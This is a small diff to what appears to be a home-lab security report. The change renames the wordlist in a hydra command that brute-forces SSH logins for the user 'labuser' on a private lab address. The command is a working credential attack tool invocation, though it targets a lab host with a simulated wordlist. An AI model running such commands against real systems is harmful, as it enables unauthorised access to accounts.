@@ -24,7 +24,7 @@ A brute-force credential attack was executed against the SSH service running on 
 ```bash
 # SSH brute force — 4 parallel threads, verbose output
 # Wordlist: wordlist-credentials.txt (12 entries)
-hydra -l labuser -P wordlist-credentials.txt ssh://192.168.110.130 -t 4 -V
+hydra -l labuser -P simulated-credential-wordlist.txt ssh://192.168.110.130 -t 4 -V
 ```
 
 **Wordlist used:** [`simulated-credential-wordlist.txt`](simulated-credential-wordlist.txt)
